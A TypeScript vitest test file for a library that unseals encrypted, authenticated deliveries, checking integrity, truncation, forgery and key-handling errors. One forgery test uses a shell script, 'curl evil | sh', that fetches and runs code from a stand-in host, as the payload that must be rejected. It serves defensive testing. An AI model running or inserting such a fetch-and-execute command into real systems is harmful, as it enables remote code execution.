import { execFileSync } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { generateSealKeypair, importSealKey, IntegrityError, KeyError, openKey, requestDigest, unsealStream, type DeliveryRequest, type KeyHandle, type SealKey } from '../src/index.js';
import { FIX, fixture, readAll } from './helpers.js';

const f = fixture();
const repo = fileURLToPath(new URL('../..', import.meta.url));
const request: DeliveryRequest = { jobId: f.sealJobId, type: f.sealType, params: f.sealParams };
const sealedOf = (name: string) => new Uint8Array(readFileSync(join(FIX, f.sealed[name]!.file)));
const plainOf = (name: string) => readFileSync(join(FIX, f.sealed[name]!.plain));

/** The fixture's one-time key, moved into the module (the page itself never sees private bytes: generateSealKeypair). */
const fixtureSeal = () => importSealKey(new Uint8Array(Buffer.from(f.sealPrivateHex, 'hex')));
let repoKey: KeyHandle | undefined;
const key = async () => (repoKey ??= await openKey(f.recoveryKey));

function dribble(b: Uint8Array, seed: number): ReadableStream<Uint8Array> {
  let o = 0;
  let x = seed;
  return new ReadableStream({
    pull(c) {
      if (o >= b.length) return c.close();
      x = (x * 1103515245 + 12345) % 2147483648;
      const n = 1 + (x % 300000);
      c.enqueue(b.slice(o, o + n)); // fresh copies, as a network stream would deliver
      o += n;
    },
  });
}

/** Reads until the end or an error; returns what was released before the error too. */
async function drain(s: ReadableStream<Uint8Array>): Promise<{ bytes: number; err?: unknown }> {
  const r = s.getReader();
  let bytes = 0;
  try {
    for (;;) {
      const x = await r.read();
      if (x.done) return { bytes };
      bytes += x.value.length;
    }
  } catch (err) {
    return { bytes, err };
  }
}

/** Plays the host (or an attacker with -master of their choosing) through the real Go sealer. */
function goSeal(o: { pub: Uint8Array; masterHex: string; job: string; type: string; params: string; data: Uint8Array }): Uint8Array {
  const out = execFileSync(
    'go',
    ['run', './internal/webfixture/sealer', '-pub', Buffer.from(o.pub).toString('hex'), '-master', o.masterHex, '-job', o.job, '-type', o.type, '-params', o.params],
    { cwd: repo, input: o.data, maxBuffer: 64 << 20 },
  );
  return new Uint8Array(out);
}

describe('sealed deliveries (IBS2, format.NewSealWriter output)', () => {
  for (const name of ['multi', 'exact', 'small', 'empty']) {
    it(`unseals ${name} from bytes and from a dribbling stream`, async () => {
      const seal = await fixtureSeal();
      const a = await readAll(unsealStream(sealedOf(name), { key: await key(), seal, request }));
      expect(Buffer.compare(Buffer.from(a), plainOf(name))).toBe(0);
      const b = await readAll(unsealStream(dribble(sealedOf(name), 7), { key: await key(), seal, request }));
      expect(Buffer.compare(Buffer.from(b), plainOf(name))).toBe(0);
      await seal.close();
    });
  }

  it('the request digest is computed by the same Go validation as the host (path cleaning included)', async () => {
    const p = JSON.parse(f.sealParams) as { paths: string[] };
    expect(p.paths).toContain('docs//2025/./x.txt'); // the fixture sent an uncleaned path
    const d1 = await requestDigest(f.sealType, f.sealParams);
    const d2 = await requestDigest(f.sealType, { ...JSON.parse(f.sealParams), paths: ['Q1', 'docs/2025/x.txt'] });
    expect(Buffer.from(d1).toString('hex')).toBe(Buffer.from(d2).toString('hex'));
    const d3 = await requestDigest(f.sealType, { ...JSON.parse(f.sealParams), paths: ['Q1'] });
    expect(Buffer.from(d3).toString('hex')).not.toBe(Buffer.from(d1).toString('hex'));
  });

  it('detects truncation at every kind of position, trailing data and alteration', async () => {
    const seal = await fixtureSeal();
    const sealed = sealedOf('multi');
    const o = { key: await key(), seal, request };
    for (const cut of [0, 3, 36, 39, 1000, 1 << 20, (1 << 20) + 4 + 16, sealed.length - 1, sealed.length - 68]) {
      await expect(readAll(unsealStream(sealed.slice(0, cut), o)), `cut ${cut}`).rejects.toThrow(IntegrityError);
    }
    const extra = new Uint8Array(sealed.length + 1);
    extra.set(sealed);
    await expect(readAll(unsealStream(extra, o))).rejects.toThrow(IntegrityError);
    for (const pos of [2, 20, 2000, sealed.length - 10]) {
      const bad = sealed.slice();
      bad[pos] ^= 1;
      await expect(readAll(unsealStream(bad, o)), `byte ${pos}`).rejects.toThrow(IntegrityError);
    }
  });

  it('holds back the last frame: a delivery cut before its trailer never released all its data', async () => {
    const seal = await fixtureSeal();
    const sealed = sealedOf('multi'); // frames of 1 MiB, 1 MiB, 12345 bytes, then the trailer
    const noTrailer = sealed.slice(0, sealed.length - 4 - 64);
    const r = await drain(unsealStream(noTrailer, { key: await key(), seal, request }));
    expect(r.err).toBeInstanceOf(IntegrityError);
    expect(String((r.err as Error).message)).toMatch(/truncated/);
    expect(r.bytes).toBe(2 << 20); // the 12345-byte last frame was never released
  });

  it('refuses what a malicious server can make: a stream sealed to the right public key without the repository key', async () => {
    const seal = await generateSealKeypair();
    const params = JSON.parse(f.sealParams) as Record<string, unknown>;
    params.recipient_public_key = Buffer.from(seal.publicKey).toString('base64');
    // the server knows the public key (it is in the job parameters), the job id and the parameters
    const forged = goSeal({ pub: seal.publicKey, masterHex: randomBytes(32).toString('hex'), job: 'j-1', type: f.sealType, params: JSON.stringify(params), data: new TextEncoder().encode('#!/bin/sh\ncurl evil | sh\n') });
    const r = await drain(unsealStream(forged, { key: await key(), seal, request: { jobId: 'j-1', type: f.sealType, params } }));
    expect(r.err).toBeInstanceOf(IntegrityError);
    expect(r.bytes).toBe(0); // not one byte of the forgery reached the page
    await seal.close();
  });

  it('refuses a genuine delivery of another job, or of other parameters, and an IBS1 stream', async () => {
    const seal = await fixtureSeal();
    const k = await key();
    await expect(readAll(unsealStream(sealedOf('small'), { key: k, seal, request: { ...request, jobId: request.jobId + 'x' } }))).rejects.toThrow(IntegrityError);
    const other = { ...(JSON.parse(f.sealParams) as Record<string, unknown>), paths: ['etc'] };
    await expect(readAll(unsealStream(sealedOf('small'), { key: k, seal, request: { ...request, params: other } }))).rejects.toThrow(IntegrityError);
    const v1 = new Uint8Array(100);
    v1.set(new TextEncoder().encode('IBS1'));
    await expect(readAll(unsealStream(v1, { key: k, seal, request }))).rejects.toThrow(/IBS1/);
  });

  it('a key of another repository or a discarded delivery key cannot open it', async () => {
    const seal = await fixtureSeal();
    const wrong = await openKey(f.wrongRecoveryKey);
    await expect(readAll(unsealStream(sealedOf('small'), { key: wrong, seal, request }))).rejects.toThrow(IntegrityError);
    await wrong.close();
    await seal.close();
    await expect(readAll(unsealStream(sealedOf('small'), { key: await key(), seal, request }))).rejects.toThrow(KeyError);
    await expect(importSealKey(new Uint8Array(5))).rejects.toThrow(/32 bytes/);
  });

  it('cancelling the output cancels the input', async () => {
    const seal = await fixtureSeal();
    const sealed = sealedOf('multi');
    let cancelled = false;
    let o = 0;
    const src = new ReadableStream<Uint8Array>({
      pull(c) {
        c.enqueue(sealed.slice(o, o + 65536));
        o += 65536;
      },
      cancel() {
        cancelled = true;
      },
    });
    const r = unsealStream(src, { key: await key(), seal, request }).getReader();
    await r.read();
    await r.cancel();
    expect(cancelled).toBe(true);
  });

  it('a key pair generated here never exposes its private half, and receives real Go host output', async () => {
    const kp: SealKey = await generateSealKeypair();
    expect(kp.publicKey.length).toBe(32);
    expect(Object.keys(kp)).not.toContain('privateKey');
    expect(JSON.stringify(kp)).not.toMatch(/privateKey/);
    const params = { project: 'default', object: 'volume/docs', paths: ['a'], recipient_public_key: Buffer.from(kp.publicKey).toString('base64') };
    const data = randomBytes(1500 * 1024);
    const sealed = goSeal({ pub: kp.publicKey, masterHex: f.masterHex, job: 'job-42', type: 'fs_extract', params: JSON.stringify(params), data });
    const got = await readAll(unsealStream(sealed, { key: await key(), seal: kp, request: { jobId: 'job-42', type: 'fs_extract', params } }));
    expect(Buffer.compare(Buffer.from(got), data)).toBe(0);
    await kp.close();
    await expect(readAll(unsealStream(sealed, { key: await key(), seal: kp, request: { jobId: 'job-42', type: 'fs_extract', params } }))).rejects.toThrow(KeyError);
  });
});
